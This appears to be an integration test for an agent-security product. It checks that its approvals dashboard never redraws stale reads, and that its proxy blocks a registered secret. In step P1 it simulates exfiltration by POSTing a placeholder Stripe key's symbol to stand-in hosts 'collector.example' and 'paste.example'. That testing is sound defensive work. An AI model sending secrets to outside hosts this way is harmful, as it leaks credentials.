/**
 * product-reads-order.test — on the agent page and Rules, a read asked
 * before your change never draws over it, across the REAL components
 * (dashboard.md §4.25 *A read asked before your change never draws over
 * it*). Mandu-new.
 *
 * The agent page is read by every Home poll and after an answer; Your rules
 * on opening Rules and after each change made there. Until 2026-10-12 the
 * answer that came LAST drew, even when its read was asked first: on a slow
 * network a question you answered on the agent page came back as waiting,
 * with live buttons, and after two changes in Your rules the read after the
 * first, answered last, drew the second change undone. Here a real
 * ArbiterServer runs at the `secrets` axes, and the net-proxy, in its
 * production wiring, stops a registered key's sends to two hosts no rule
 * names, so two real questions wait. A real
 * DashboardServer reaches the arbiter over the production adapter
 * (`makeApprovalsArbiter`), and the served product page (its own index.html
 * and home.js in jsdom, signed in) reaches the dashboard through a relay
 * that holds one answer back (tests/lib/holding-relay.ts):
 *
 *   P1  the stops: each send is refused, never forwarded, and a question
 *       waits for each host;
 *   P2  the agent page: a poll's read of it is held; Block on the first
 *       question: the server resolves it, and the read after the answer
 *       draws only the second;
 *   P3  the held read (both waiting) comes: the answered question is never
 *       drawn again, and only the second has live buttons; Block on it;
 *   P4  Rules lists both answers; the read after Remove on the first is
 *       held; Remove on the second, and its read draws neither;
 *   P5  the held read (the second answer still there) comes: the second is
 *       never drawn again, and the server lists neither;
 *   P6  no unhandled rejection; the oracle: no page or answer read here
 *       carries the key, and no page drawn carries a token.
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { resetCurrentPolicyForTests } from "../../arbiter/policy/compiled-policy.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { makeApprovalsArbiter } from "../../dashboard/src/arbiter-adapter.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { ADMIN_COOKIE, ADMIN_OPTS, CSRF_ADMIN } from "../../dashboard/test/unit/admin-session.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { holdingRelay } from "../lib/holding-relay.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF

after(() => resetCurrentPolicyForTests("claude-code"));

const KEY_VALUE = "sk_live_productReadsOrderStackKey00001";
const SESSION = "1791400000-1445";
const AGENT_READ = `/api/home/agent?session=${SESSION}`;
const PANEL_READ = "/api/policy/panel";
/** How long a page is given to draw a held answer it must drop: a page
 *  that draws it changes within this, a page that drops it never does. */
const SETTLE_MS = 1500;

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Doc = any;
const button = (root: Doc, label: string) => root && [...root.querySelectorAll("button")].find((b: Doc) => b.textContent === label);
const waitingCards = (doc: Doc): Doc[] => [...doc.querySelectorAll("#agent-waiting .ask")];
const cardOf = (doc: Doc, id: string) => waitingCards(doc).find((c) => c.dataset.id === id);
/** The cards whose answer buttons are live. */
const liveCards = (doc: Doc): string[] => waitingCards(doc).filter((c) => [...c.querySelectorAll("button")].some((b: Doc) => !b.disabled && b.textContent !== "?")).map((c) => c.dataset.id);
/** Your answer to question `id` on Rules. */
const answerRow = (doc: Doc, id: string) => doc.querySelector(`#rules-list .row.rule[data-rule="answer:${id}"]`);
/** The opened part under an answer's row (its ⋯ opened). */
function openedUnder(doc: Doc, id: string): Doc {
  const more = answerRow(doc, id).querySelector(".file-more");
  if (more.getAttribute("aria-expanded") !== "true") more.click();
  return answerRow(doc, id).nextElementSibling;
}
/** A poll, as a return to the tab makes one (the page's 10 s poll is inert here). */
const poll = (doc: Doc) => doc.dispatchEvent(new doc.defaultView.Event("visibilitychange"));
/** Press a button the way a keyboard does: the focus on it first. */
function press(b: Doc): void {
  assert.ok(b && !b.disabled, "the button is drawn and on");
  b.focus();
  b.click();
}

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

test("the agent page and Rules over the real arbiter: a read asked before your answer or change never draws over it; no secret anywhere", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-product-reads-order-"));
  const home = join(tmp, "home");
  const repo = join(home, "proj");
  mkdirSync(repo, { recursive: true });
  const policyPath = join(tmp, "policy.yaml");
  writeFileSync(policyPath, "version: 1\n");
  const socketPath = join(tmp, "arbiter.sock");
  const adminSock = join(tmp, "admin.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: adminSock, humanSocketPath: humanPath,
    dbPath: join(tmp, "mandu.db"), eventDir: join(tmp, "events"), policyPath, policyPollMs: 0,
    adminPolicyDir: null, promptPackDir: null, adminPromptPackDir: null,
    confidentiality: true, integrity: false, log: () => {},
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);
  const gate = new ArbiterClient(socketPath);
  await gate.connect();
  const admin = new ArbiterClient(adminSock);
  await admin.connect();

  const wired = await makeApprovalsArbiter(socketPath, () => ({ socketPath: adminSock }));
  assert.ok(wired?.policyDoc, "the production adapter has the policy surface");
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter: wired.arbiter, policyDocArbiter: wired.policyDoc,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mhome"), MANDU_POLICY_FILE: policyPath },
    log: () => {}, ...ADMIN_OPTS,
  });
  const port = await dashboard.listen(0);
  const relay = await holdingRelay(port);
  const bodies: string[] = [];
  const read = async (path: string) => {
    const r = await pageFetch(`http://127.0.0.1:${port}${path}`, { headers: CSRF_ADMIN });
    const text = await r.text();
    bodies.push(text);
    assert.equal(r.status, 200, `${path}: ${text}`);
    return JSON.parse(text);
  };
  const unhandled: string[] = [];
  const onUnhandled = (e: unknown) => unhandled.push(String((e as Error)?.message ?? e));
  process.on("unhandledRejection", onUnhandled);
  const rendered: string[] = [];
  try {
    // ── P1: a registered key bound for a host no rule names is stopped ───────
    const keyFile = join(repo, "stripe.env");
    writeFileSync(keyFile, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: keyFile, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    const ids: string[] = [];
    for (const host of ["collector.example", "paste.example"]) {
      const res = await viaProxy(proxyPort, `http://${host}/upload`, `k=${keySym}`);
      assert.equal(res.status, 403, `the send is stopped: ${res.body}`);
      assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
      const row = (await admin.egressApprovals("pending")).find((a) => a.symbol === keySym && a.destination === host);
      assert.ok(row, `the stop queued a question for ${host}`);
      ids.push(row!.id);
    }
    assert.deepEqual(forwarded, []);
    const [first, second] = ids as [string, string];
    // The agent page lists them once the stops' events are stored (emission
    // is best-effort and asynchronous).
    let listed = false;
    for (let i = 0; i < 100 && !listed; i++) {
      const vm = (await read(AGENT_READ)) as { waiting?: Array<{ id: string }> };
      listed = ids.every((id) => vm.waiting?.some((w) => w.id === id));
      if (!listed) await new Promise((r) => setTimeout(r, 20));
    }
    assert.ok(listed, "the agent page lists both questions");

    // ── P2, P3: the agent page ───────────────────────────────────────────────
    await servedProductPage(relay.base, `/agents/${SESSION}`, (doc: Doc) => !!cardOf(doc, first) && !!cardOf(doc, second), async (doc: Doc) => {
      const keep = () => rendered.push(doc.documentElement.outerHTML);
      keep();
      const before = relay.holdNext(AGENT_READ);
      poll(doc);
      assert.equal(await before.asked, 200, "the poll's read of the page was answered with both waiting, and held");
      press(button(cardOf(doc, first), "Block"));
      await waitWhile(() => !!cardOf(doc, first));
      assert.equal(cardOf(doc, first), undefined, "the read after the answer draws without it");
      assert.ok(cardOf(doc, second), "the other still waits");
      assert.deepEqual((await admin.egressApprovals("pending")).filter((a) => a.id === first), [], "the server resolved it");
      keep();
      await before.release();
      await waitWhile(() => !cardOf(doc, first), SETTLE_MS);
      assert.equal(cardOf(doc, first), undefined, "the answered question is never drawn as waiting again");
      assert.deepEqual(liveCards(doc), [second], "only the other question has live buttons");
      keep();
      press(button(cardOf(doc, second), "Block"));
      await waitWhile(() => !!cardOf(doc, second));
      assert.equal(waitingCards(doc).length, 0, "both answered");
    }, { headers: { Cookie: ADMIN_COOKIE } });

    // ── P4, P5: Rules ────────────────────────────────────────────────────────
    const both = (doc: Doc) => !!answerRow(doc, first) && !!answerRow(doc, second);
    await servedProductPage(relay.base, "/rules", both, async (doc: Doc) => {
      const keep = () => rendered.push(doc.documentElement.outerHTML);
      keep();
      const held = relay.holdNext(PANEL_READ);
      press(button(openedUnder(doc, first), "Remove"));
      assert.equal(await held.asked, 200, "the read after the first Remove was answered, and held");
      press(button(openedUnder(doc, second), "Remove"));
      await waitWhile(() => !!answerRow(doc, second) || !!answerRow(doc, first));
      assert.equal(answerRow(doc, second), null, "the read after the second Remove draws neither");
      assert.equal(answerRow(doc, first), null);
      const queue = (await read(PANEL_READ)).panel.queue.map((q: { id: string }) => q.id);
      assert.ok(!queue.includes(first) && !queue.includes(second), "the server lists neither");
      keep();
      await held.release();
      await waitWhile(() => !answerRow(doc, second), SETTLE_MS);
      assert.equal(answerRow(doc, second), null, "the removed answer is never drawn again");
      assert.match(doc.getElementById("rules-notice").textContent, /^Answer removed\./);
      keep();
    }, { headers: { Cookie: ADMIN_COOKIE } });
    await new Promise((r) => setTimeout(r, 50));
    assert.deepEqual(unhandled, [], "no unhandled rejection in the page");

    // P6: the oracle on every page drawn and every answer read above.
    assert.equal(rendered.length, 6);
    for (const text of [...rendered, ...bodies]) assert.ok(!text.includes(KEY_VALUE), "no key in a page or an answer");
    for (const text of rendered) assert.doesNotMatch(text, /\$MDU/, "no token in a page drawn");
  } finally {
    process.off("unhandledRejection", onUnhandled);
    await relay.close();
    await dashboard.close();
    await proxy.close();
    netClient.close();
    netHuman.close();
    gate.close();
    admin.close();
    wired?.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
